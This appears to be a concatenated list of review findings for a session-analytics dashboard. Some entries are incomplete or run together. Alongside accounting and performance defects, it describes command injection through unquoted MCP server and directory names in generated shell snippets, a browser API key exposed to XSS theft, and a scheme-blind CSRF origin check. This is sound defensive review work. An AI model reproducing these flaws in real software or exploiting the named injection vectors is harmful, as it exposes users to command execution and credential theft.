findings.fix: Use a streaming/stable content digest plus length as the aggregation key and retain only the bounded 40-character preview needed for evidence; resolve rare hash collisions with a secondary bounded check if necessary.

findings.title: Unattended entrypoint is insufficient evidence for a booked Batch API saving
findings.what: Every sufficiently large sdk-* session is assigned a 50% estSavingsUsd and booked reclaim. The only eligibility evidence is unattended entrypoint plus optional schedule events. Neither field proves the workload accepts Batch API semantics or up-to-24-hour latency; the action itself acknowledges this still needs confirmation. Consequently the booked aggregate can count savings for latency-sensitive automation.
findings.fix: Require an explicit observed/configured batch-eligible or async-tolerant signal before emitting estSavingsUsd/reclaim. Without it, emit only a non-booked tier-0 opportunity ceiling and state that eligibility is unverified.
findings.acceptance: A token-heavy sdk-* session without explicit async/batch eligibility has no estSavingsUsd or reclaim; a fixture with the eligibility artifact books exactly 50% of standard input/output cost, excludes cache pools, and cites that artifact and field in provenance.
findings.verifyNote: The second pass re-read selection, reclaim, action, attribution, and provenance. No field beyond sdk-* entrypoint and scheduledFires establishes async tolerance, while the unconditional reclaim is constructed before the copy tells the user to confirm it.

findings.title: All 1-hour cache writes are booked as recoverable despite missing reuse evidence
findings.what: The calculation includes every 1-hour cache-write token and books the full 1h-to-5m price delta. It never examines reuse timing or cache reads, even though its action makes recoverability conditional on context not being reused beyond five minutes. Legitimately reused 1-hour entries therefore inflate estSavingsUsd and reclaim.
findings.fix: Gate booked savings on reproducible evidence that each write received no reuse after five minutes, or downgrade the current amount to a non-booked maximum exposure estimate. Add structured provenance for the token, pricing, and reuse fields.
findings.acceptance: A fixture with a 1-hour write reused after a greater-than-five-minute gap contributes zero booked savings; an evidenced non-reused write contributes only its re-derived rate delta, and the returned recommendation contains structured provenance identifying the reuse artifact and fields.
findings.verifyNote: The second pass re-read the complete calculation and return object. The loop consumes only cacheCreation1hTokens, cacheCreationTokens, model, and sessionId; no reuse field is consulted, yet the computed delta is unconditionally exported and reclaimed.

findings.title: Payload-size heuristics are emitted as evidence of task-specific over-fetch and compounded cache reads
findings.what: The only cited artifact is resultBytes, but the detector states that calls pulled more than the task used, that a targeted alternative would have been smaller, and that the excess was cache-read on every later turn. Result size alone establishes none of task usage, an actually available smaller slice, or the number of subsequent model turns. The related baseline helper confirms the compounded value is a projection from later tool-call count, not observed cache-read attribution.
findings.fix: Describe these outputs explicitly as heuristic candidates and a projected upper bound, remove the observational claim that a targeted alternative was smaller, and do not book reclaim unless turn-level cache attribution or another observed reuse field supports it.
findings.acceptance: A fixture containing a large final/necessary Read or multiple tool calls within one model turn produces no observed over-fetch/reclaim claim; any remaining projection is labeled as an estimate with provenance naming the heuristic fields and assumptions.
findings.verifyNote: Adversarially re-read the cited recommendation/provenance lines and the directly related baseline toolPayloadRightSizing implementation. It derives excess from fixed byte thresholds and multiplies by subsequent tool-call count; it does not observe task usage, alternative-result size, or subsequent model-turn cache reads.

findings.title: Zero same-session cache reads does not prove the full 1-hour write was waste
findings.what: The detector labels every 1-hour write in a session with zero cache-read tokens as deterministic concrete waste and exports the entire write cost as savings. This observation does not establish that the cache entry was never reused outside that session, after the captured interval, or that a shorter-cache alternative would have avoided the full write cost. The arithmetic measures spend correctly but the recoverability inference is unsupported.
findings.fix: Report this as an unverified candidate or maximum exposure unless cache-key/lineage and time-window evidence proves non-reuse. Do not set estSavingsUsd from same-session zero reads alone, and date any incomplete historical observation as of the capture boundary.
findings.acceptance: A fixture with a 1-hour write and zero same-session reads yields no booked savings and no 'concrete waste' claim absent explicit non-reuse evidence; with complete lineage/time-window evidence, only proven unused writes are counted and provenance cites those fields and the observation boundary.
findings.verifyNote: The second pass re-read filtering, arithmetic, action, savings export, and provenance. The sole predicate is cacheCreation1hTokens > 0 plus same-session cacheReadTokens === 0; the code has no cache lineage or observation-completeness evidence capable of proving non-reuse.

findings.title: MCP server names enable command injection in generated fixes
findings.what: Server names originate in parsed MCP state and are inserted raw into shell command lines and a double-quoted echo. A name containing whitespace, semicolon, command substitution, quotes, or a leading option changes the copied command and can execute attacker-controlled shell syntax.
findings.fix: Validate names against the CLI's canonical server-name grammar and shell-quote every argument and diagnostic value; pass `--` before the name if the CLI supports it. Refuse to emit an executable snippet for an invalid name.
findings.acceptance: Tests with spaces, quotes, semicolons, `$()`, newlines, and leading dashes prove the generated snippet parses each accepted name as exactly one inert argument and rejects unsupported names without emitting executable shell.

findings.title: Historical hook errors are promoted to an undated current warning

findings.acceptance: Given three old error events and liveConfig=null, the recommendation is info severity, its title or detail contains the newest event date as “as of YYYY-MM-DD,” provenance.asOf matches it, and no present-tense current-failure assertion is emitted.

findings.title: Suggested hook fix disables genuine failures

findings.fix: Replace the unconditional success fallback with a concrete conditional that distinguishes the documented advisory outcome from genuine failure, or omit the snippet until that distinction can be expressed safely.
findings.acceptance: A test executes the proposed decision logic against success, advisory, and genuine-failure exit codes and proves that only the advisory case becomes success while a genuine failure remains nonzero.
findings.verifyNote: The second pass re-read the complete action, note, and snippet. The contradiction survives directly: lines 25 and 31 promise selective blocking, while line 37 unconditionally masks all nonzero exits.

findings.title: Generated MCP authentication fix is not copy-paste-safe

findings.acceptance: For every supported server name, copying the emitted snippet passes exactly that name as one argv element; hostile or unsupported names produce no executable fix and a clear manual-action message.

findings.title: Negative token counts corrupt failed-agent accounting
findings.what: The sum treats every non-null token value as valid and marks only null values unknown. A finite negative artifact value therefore subtracts from the total while still allowing provenance to call the failed-agent counts complete. For example, failed agents with 50000, -20000, and 20000 tokens produce a '~50k' complete claim rather than rejecting the negative row and reporting at least ~70k with one unknown/invalid count.
findings.fix: Accept tokens only when they are finite, non-negative safe numbers; sum only accepted values and include invalid values in the unknown/incomplete count.
findings.acceptance: Add a detector test with three qualifying failures whose tokens are 50000, -20000, and 20000. The recommendation must report at least ~70k known tokens, identify one unavailable/invalid token count, and must not describe the token accounting as complete.
findings.verifyNote: Adversarially re-read the cited reduction, completeness branch, and provenance emission. The directly related baseline parser rejects non-finite values but accepts finite negative numbers, so the malformed value reaches this detector; existing malformed-agentCount defenses do not cover tokens.

findings.title: Wall-clock buckets can exceed the measured runtime they claim to attribute
findings.what: Serial timeline gaps are summed independently, then subtracted from active runtime with `Math.max(0, ...)`. When serial gaps exceed active runtime, the excess is retained in `serialToolMs` while `modelWorkingMs` stops at zero. The test supplies 20 minutes of active turns and 24 minutes of serial gaps plus 16 minutes idle, so the detector reports 40 minutes “of measured wall-clock” from 36 minutes of runtime turns. This also incorrectly selects serial tools as dominant and recommends batching without proving the gaps are independent.
findings.fix: Join tool gaps to their containing active turns and cap or union their duration so `modelWorkingMs + serialToolMs` never exceeds active runtime; treat unmatched/overlapping gaps as separate diagnostic evidence rather than an attributed bucket. Do not label gaps independent without an independence signal.
findings.acceptance: For the existing fixture, attributed total must equal the 36-minute runtime total, all buckets must be non-negative and non-overlapping, and a regression assertion must enforce `modelWorkingMs + idleMs + serialToolMs <= sum(valid runtime turn durations)`.
findings.verifyNote: Adversarial arithmetic re-derived the fixture: active runtime is 12m + 8m = 20m, idle is 16m, and timeline gaps are 9m + 8m + 7m = 24m. Lines 182 and 271-280 consequently produce 0m + 16m + 24m = 40m, exceeding the 36m measured runtime; the test explicitly expects these component values.

findings.title: Summary absence is presented as proof of independent tool calls
findings.what: The independence gate searches only `entry.summary`, but the provenance and detail call that value the earlier call's “result” and assert that the surviving count is a lower bound of calls that did not depend on it. A timeline summary may omit or truncate a path that existed in the actual tool result; textual absence from that summary therefore cannot establish independence. Each such false survivor also receives a fixed two-second reclaimed-time credit.
findings.fix: Either gate against a completeness-guaranteed result field, or relabel the metric as a summary-based heuristic and remove the lower-bound, proven-independence, avoidable-round-trip, and guaranteed reclaimed-time claims.
findings.acceptance: A fixture where the actual prior result contains the later path but its summary omits that path must not increment `independent` or `estTimeReclaimedMin`; alternatively, emitted copy and provenance must explicitly describe the result as an incomplete summary and make no lower-bound or proven-dependency claim.
findings.verifyNote: Adversarial re-read confirmed that line 178 is the sole stored result text, sourced from `entry.summary`; lines 283 and 310-313 nevertheless describe the full earlier result and a lower bound. No complete-result check appears in the dispatched file.

findings.title: Newlines in task subjects escape the comment-only command snippet

findings.title: Unquoted session directory name makes the recommended inspection command injectable
findings.what: The detector interpolates a session directory name directly into a shell command. A valid directory entry containing shell metacharacters such as `;` or command substitution changes the command when the user copy-pastes the recommended fix, rather than merely selecting that session's JSON files.

findings.title: Seven recommendation detectors omit required structured provenance

findings.title: Concordance gate performs quadratic work over the full task corpus
findings.what: `divergenceAutonomyConcordance` compares every matched pair with nested loops, performing n(n-1)/2 iterations on every detector evaluation. The input is not capped, so large ingests can turn this recommendation gate into a CPU latency hotspot.
findings.fix: Compute Kendall-style concordance in O(n log n) using sorting plus inversion counting with explicit tie handling, or enforce a documented deterministic sample/budget before pairwise comparison.
findings.acceptance: Add a large-corpus benchmark/probe that exercises at least 100,000 matched rows, verifies the same concordance result as the pairwise reference on smaller randomized corpora, and demonstrates O(n log n) scaling within the detector budget.
findings.verifyNote: Adversarial re-read confirmed `pairs` includes every matched steering row and lines 139-148 have no cap or early termination; the exact iteration count is n(n-1)/2, so the hotspot is deterministic and reproducible.

findings.title: Each interrupt rescans the session's full token history
findings.what: wastedInWindow loops over all token entries, and collectSessionInterrupts invokes it separately for every qualifying interrupt. A session with I interrupts and T token entries therefore performs O(I×T) parsing and pricing work on the detector hot path.
findings.fix: Sort/index token entries once per session and advance a monotonic cursor alongside timeline traversal, or use timestamp binary searches plus prefix sums for output tokens and per-model cost.
findings.acceptance: A performance probe with many interrupts and token entries shows unchanged wasted-token/dollar results while token-entry processing scales linearly or O((I+T) log T), with no full rescan per interrupt.
findings.verifyNote: Adversarial re-read confirmed the full token loop at src/lib/detectors/workflow/mid-turn-interrupt-steering.ts:63-69 is called from the interrupt branch at lines 107-116. The advancing boundary prevents double counting but does not prevent repeated scans.

findings.title: Span sizing repeatedly scans all token entries for each span
findings.what: spanTokenPoolsFor iterates a session's token rows from the beginning for every steering span (lines 191-216), and rule calls it once per span at lines 353-370. For S spans sharing a session with T token entries this is O(S×T), despite rows already being timestamp-sorted.
findings.fix: Build per-session prefix sums for the four token pools and use binary searches for each span's start/end indices, reducing each span query to O(log T).
findings.acceptance: Add a multi-span performance probe with at least 1,000 spans and 100,000 token entries in one session; verify token totals are unchanged and entry visits/query work scale near O(T + S log T), not O(S×T).
findings.verifyNote: Second pass re-read confirmed tokenEntriesBySession sorts rows at src/lib/detectors/workflow/human-input-leverage.ts:173-189, but spanTokenPoolsFor at lines 191-216 linearly rescans them and is invoked inside the per-span map at lines 353-370. findings.title: Quadratic maximality scan can stall large tool-data ingests

findings.fix: Index qualifying candidates by project, sequence length, and contiguous subsequence identity, then test only possible longer supersequences; alternatively record occurrence/subsumption relationships while enumerating bounded windows so maximal candidates are selected without an all-pairs pass.

findings.verifyNote: Adversarial re-read confirmed lines 608-658 generate every length-3..8 window and lines 695-714 retain qualifying windows before an unbounded nested filter/some scan. The constant maximum window length does not remove the quadratic dependence on the number of qualifying windows.

findings.fix: Keep the value explicitly labeled as an observed elapsed burst span and classify it as accounting/observational, omitting estTimeReclaimedMin, unless an artifact directly measures active human effort and links the rediscovery to the cited missing handoff. findings.title: Directory drag-and-drop performs one render-triggering update per file
findings.what: walkDirectory invokes the progress callback after every admitted file, and the callback immediately calls setScannedCount. Each asynchronous file lookup can therefore cause another render. The handler also accumulates every File handle in recursive arrays and allFiles before the worker pipeline begins, with no loose-directory entry budget. A large ~/.claude selection can spend substantial main-thread time scanning and rendering before parsing starts.
findings.fix: Throttle progress updates by time or batch, enforce an admitted-file limit during directory traversal, and feed bounded batches to the pipeline where feasible.
findings.acceptance: A deterministic directory-walk benchmark with at least 10,000 admitted files completes within a documented budget, performs a bounded number of progress state updates independent of file count, and rejects selections over the configured file limit with a clear status.
findings.verifyNote: Adversarial re-read confirmed that src/components/FileUpload.tsx:95-106 calls progress once per accepted file and src/components/FileUpload.tsx:227-233 binds that callback directly to setScannedCount while retaining all returned files. The worker handoff at lines 246 and 150-160 occurs only after traversal, so worker parsing does not mitigate this scan/render path.

findings.title: Live polling permits unbounded concurrent requests
findings.what: The 10-second interval starts poll regardless of whether the preceding fetchLive call has settled. During sustained endpoint latency or a hung request, concurrent requests grow once per interval for the lifetime of the mounted widget.
findings.fix: Allow only one in-flight poll and schedule the next poll after it settles; retain the unmount cancellation guard.
findings.acceptance: With fetchLive held pending while fake time advances across at least five intervals, assert it is called exactly once; after resolving it, assert exactly one subsequent poll is scheduled.
findings.verifyNote: Adversarial re-read verified that src/components/LiveSession.tsx:128-129 starts the initial poll and an unconditional interval, with no pending flag or abort controller. The test at src/components/LiveSession.test.ts:139-164 checks timer cleanup only and supplies immediately resolved requests.

findings.title: Out-of-order live polls can restore stale session state
findings.what: setInterval invokes poll without an in-flight or generation guard. If poll A remains pending while poll B starts and B resolves first, A can later call setLive with older data, reverting the widget to a stale session or resurrecting a session after a newer inactive response.
findings.fix: Serialize polls with recursive setTimeout after settlement, or attach a monotonically increasing request generation and apply only the newest response.
findings.acceptance: Add a test using two deferred fetchLive promises: resolve the second with {active:false}, then resolve the first with active data, and verify the component remains inactive; the test must pass with the implemented ordering guard.
findings.verifyNote: Second pass confirmed the only guard at src/components/LiveSession.tsx:124 is component cancellation, not request ordering. The existing polling test at src/components/LiveSession.test.ts:139-164 resolves requests in order and therefore does not cover the reproducible stale-response sequence.

findings.title: Server hybrid search issues a request for every keystroke
findings.what: The effect invokes fetchSearch immediately whenever query changes. Typing a query therefore starts one server hybrid-search request per keystroke. findings.title: Route-scoped radar rankings consume unfiltered runtime events
findings.what: The component derives route-scoped timelines, token data, tool data, and API errors, but builds runtimeById directly from the complete runtimeEvents prop. A date-filtered partial session can therefore receive full-session runtime evidence in computeSessionScorecard, changing its radar composite and top/bottom ranking with evidence outside the displayed scope. Project or mode filters can likewise admit runtime data without applying the same predicate used for the other inputs.
findings.fix: Derive a route-scoped runtime-events collection using the same supported project/date/mode semantics before building runtimeById, or omit runtimeEvents from a scorecard whenever the selected scope cannot be reproduced at runtime-event granularity.
findings.acceptance: Add a component regression fixture containing one session with in-scope timeline/token/tool data and runtime events split across an included and excluded date; verify that changing only excluded runtime evidence does not change the displayed route-scoped radar score or rank. Repeat for every route dimension the runtime-event shape supports.
findings.verifyNote: Adversarial re-read confirmed that lines 762-777 explicitly scope every other scorecard input, while line 820 maps raw runtimeEvents and line 836 passes that unfiltered record into the scorecard. The finding is limited to this reproducible scope mismatch and does not assume a defect in the imported scorecard implementation.

findings.title: Polling permits overlapping status requests
findings.what: tick awaits fetchRemoteSessions, but setInterval invokes tick every four seconds independently of whether an earlier invocation has settled. If requests take longer than the interval or stall, concurrent requests accumulate, increasing browser, server, and cluster-status load and permitting older responses to overwrite newer state.
findings.fix: Use a self-scheduling timeout started in tick's finally block, or guard tick with an in-flight flag/AbortController so at most one polling request exists and cancel it during cleanup.
findings.acceptance: With fetchRemoteSessions held pending across multiple four-second clock advances, verify it is called only once; after resolving it, verify exactly one later poll is scheduled, and verify unmount aborts or prevents further polling and state updates.
findings.verifyNote: Adversarial re-read confirmed there is no in-flight guard or request abort: line 73 awaits the request, while line 80 independently schedules repeated tick calls. The cleanup flag suppresses state updates after unmount but does not cancel or serialize requests.

findings.title: Collapsed workflow rows eagerly render every run's full agent detail
findings.what: The list maps every workflow to an expandable row but unconditionally mounts RunDetail inside that row even when isExpanded is false. RunDetail immediately derives phase aggregates and renders the default PhaseTree, which maps every phase and agent into tables. Initial page cost and DOM size therefore grow with the total agents across all historical runs, rather than with the visible rows or the one expanded run.
findings.fix: Render RunDetail only when isExpanded is true (or lazily mount/cache it after first expansion); for large ledgers, also consider row virtualization or pagination behind a measured budget.
findings.acceptance: Add a test with multiple collapsed runs asserting that no run-phase-tree or agent detail exists before expansion, then expand one row and assert only that run's detail mounts. A render/DOM probe with many runs must show initial mounted agent rows bounded independently of total historical agents.
findings.verifyNote: Adversarial re-read confirmed isExpanded is computed at src/components/WorkflowList.tsx:423 and passed to PatternFly row wrappers, but RunDetail is unconditional at line 450. The same file shows RunDetail computes phaseAggregates at line 274 and PhaseTree maps phases and AgentTable maps agents at lines 163-188 and 124-126. Existing batch test behavior at src/components/WorkflowList.test.ts:113-135 independently confirms agent detail is present before the collapsed row is expanded; that test is comparison support and is not included in findings[].files.

findings.title: Observer rebuild loses every mounted row sentinel
findings.what: The effect depends on rowCount and rootMargin. On either change, cleanup disconnects the old observer and clears elementIndex, intersecting, and pending. The new effect can only observe pending elements, but refs for already-mounted sentinels need not fire again, so pending is empty and the new observer tracks nothing. Visibility then remains stale or stuck on the initial slab, defeating viewport-bounded rendering and potentially hiding rows after the count changes.
findings.fix: Retain a current element-to-index registry across observer rebuilds and have each new observer register every connected element; remove individual entries when ref callbacks receive null. Add a rerender regression test that changes rowCount or rootMargin and then fires the replacement observer.
findings.acceptance: A test mounts 200 rows, rerenders with a changed rowCount or rootMargin, verifies the replacement observer observes existing sentinels, fires an intersection near row 100, and confirms row 100 becomes visible while the visible count remains bounded.
findings.verifyNote: Adversarial re-read confirmed the cleanup at lines 96-101 clears every source of elements before the dependent effect recreates the observer, while lines 90-95 only flush pre-effect pending refs. The dispatched tests cover mount, intersection, and unsupported fallback but no dependency-changing rerender.

findings.title: Savings headline reports an all-turn share as a share of trivial turns

With the dispatched fixture, the calculation is 40/100 = 40%, while the wording claims 40% of the trivial-turn population rather than 40% of all turns. This misstates the denominator of an evidence-bearing savings recommendation.
findings.fix: Change the headline to say "routing 40% of turns to Haiku" (or calculate the actual proportion of trivial turns routed if that is the intended claim), and name the variable for its denominator.
findings.acceptance: Using the existing 100-total/40-trivial fixture, a test asserts the rendered headline says "40% of turns" and does not say "40% of trivial turns"; add a non-round fixture to verify the displayed percentage derives from trivialTurns/totalTurns.
findings.verifyNote: Adversarial re-read confirmed lines 54 and 58 use different denominators in calculation and prose. findings.title: Marker coincidence is overstated as proof that the recommended fix was applied
findings.what: The ADR calls a FIRING→SUPPRESSED marker transition deterministic evidence that the finding caused a change and that the fix snippet was applied, then reports the state as ADOPTED. The marker contract only establishes that a matching heading and case-insensitive phrase fragments exist somewhere in merged CLAUDE.md after the finding was surfaced. Those fragments can be written independently, pre-exist in a different merged scope, or arrive for an unrelated reason; temporal ordering does not prove that the recommendation caused or exactly supplied the change. The lower-bound caveat addresses missed adoptions but not these false-positive attribution paths.
findings.fix: Rename the measured state and aggregate to marker-confirmed suppression or configuration alignment, and state that it is evidence consistent with adoption rather than proof of recommendation-caused application. Reserve ADOPTED/coached attribution for an explicit user action receipt or a verified before/after hunk tied to the surfaced finding.
findings.acceptance: A documentation check confirms that the cited sections no longer say markers prove the snippet was applied or that the finding caused the change; cards and aggregates use non-causal marker-confirmed terminology unless the design adds an explicit action receipt or tied before/after diff as required evidence.
findings.verifyNote: Adversarially re-read the cited passages and compared them with the baseline matcher. The related implementation merges global and per-project CLAUDE.md text, accepts any matching heading regex, and checks body phrases using case-insensitive substring inclusion; it does not verify an exact pasted snippet, a localized hunk, authorship, or causation. The candidate therefore survives as a reproducible claim-semantics defect rather than a style objection.

findings.title: Browser API key is persisted in localStorage
findings.what: The accepted BYO design stores the user's Anthropic API key in localStorage. Any successful same-origin XSS or compromised same-origin script can read and exfiltrate this long-lived credential; exempting the path from the server chokepoint does not mitigate client-side credential theft.
findings.fix: Revise the BYO contract to keep the key in memory for the active operation or session only, require explicit re-entry after reload, and require a restrictive CSP with no untrusted script execution. Do not persist the raw key in localStorage or another script-readable durable store.
findings.acceptance: The ADR no longer permits raw API-key persistence in localStorage; it specifies memory-only/session-bounded handling and CSP requirements, and an automated browser check proves reload clears the credential and no durable web-storage entry contains it.
findings.verifyNote: Adversarially re-read the accepted Decision at lines 30-44 and the security consequences/rejected alternatives at lines 135-173 in immutable baseline c8b98a29508b5eb7725c75a7e2a41dfa94c1feba. The server chokepoint and OAuth invariant protect server egress but do not protect a script-readable browser credential; no mitigation for localStorage theft is stated.

findings.title: Per-invocation UUID defeats the required byte-identical cache warm-up
findings.what: The recommended command expands `$(uuidgen)` every time it runs, while the next required control says warm-up and measured commands must use byte-identical appended system-prompt content. Following the snippet separately for warm-up and measurement therefore creates different cache lineages, reproducing the exact confound the methodology is meant to prevent.
findings.fix: Generate one salt per arm once, persist it in an arm variable or run manifest, and reuse that exact value for both warm-up and every measured invocation for that arm.
findings.acceptance: A documented example assigns one stable salt per arm before any invocation, demonstrates warm-up and measured commands expanding to identical `--append-system-prompt` values within an arm, and demonstrates distinct values between arms.
findings.verifyNote: Adversarial re-read confirmed the direct contradiction between docs/experiment-methodology.md:30-33 and :46-55 at the immutable baseline; no implementation comparison was needed.

findings.title: Push-ingest authentication is absent from the machine-readable security contract
findings.what: The operation description states that POST /api/ingest/{sourceId}/artifacts requires ingest authentication, but the operation has no `security` declaration and `components.securitySchemes` defines only CSRF, enterprise Bearer, and Basic authentication. The documented responses also omit the authentication failure response.

findings.title: Personal OAuth dispatch lacks the required ~/.claude LLM-egress boundary
findings.what: The design permits `personal-oauth` credentials with in-pod refresh and mounts the resolved credential into a general-purpose `claude -p` container. It applies ADR 0008 egress scrubbing only to `enterprise-api`; the sidecar allowlist at lines 502-510 governs telemetry sent to push-ingest, not content read by Claude and sent in subscription-authenticated LLM requests. Excluding seeded session history from the image likewise does not prevent runtime ~/.claude files from entering model context. Thus the required rule that a subscription OAuth credential must never send ~/.claude content is not enforced.
findings.fix: Require an explicit personal-OAuth execution boundary: do not mount or expose ~/.claude session/config content to the Claude process except the minimal credential material, enforce an allowlisted workspace for model-readable files, and add a fail-closed ADR 0008 egress scrub that rejects subscription-authenticated requests containing classified ~/.claude content.

The test must separately prove that push-ingest filtering is not being mistaken for LLM-egress filtering.

findings.title: CSRF origin comparison discards the URL scheme
findings.where: docs/plans/openshift-mvp/40-same-origin-csrf.md:95-153, especially lines 122 and 142-152; the incorrect scheme-check claim is repeated at lines 312-315, and the test matrix at lines 326-350 omits a scheme-mismatch case.
findings.what: The proposed code stores and compares `URL.host`, which contains only hostname and port. With `PUBLIC_ORIGIN=https://dashboard.probaitio.com`, an Origin of `http://dashboard.probaitio.com` therefore passes even though HTTP and HTTPS are different origins. The document explicitly claims the scheme check is implicit, but `.host` excludes the scheme. This weakens the public-flavor CSRF boundary and contradicts the promised exact-origin comparison.
findings.fix: Store a canonical configured `URL.origin` and compare it with `new URL(origin).origin`. Require the hosted `PUBLIC_ORIGIN` to use `https:` and reject credentials, non-root paths, query strings, and fragments. Represent loopback development entries as explicit full origins.
findings.acceptance: A focused origin-gate test must accept the configured `https://dashboard.probaitio.com`, reject `http://dashboard.probaitio.com`, reject foreign and missing origins, preserve the intended explicit loopback origins, and fail startup for malformed or non-origin `PUBLIC_ORIGIN` values.
findings.verifyNote: Adversarially re-read the proposed parser and comparator at lines 95-153, the scheme rationale at lines 312-315, and the test plan at lines 326-350 in baseline c8b98a29508b5eb7725c75a7e2a41dfa94c1feba. Both configured and request URLs are reduced to `.host`, conclusively erasing the scheme, and no planned assertion covers the same-host/different-scheme case.
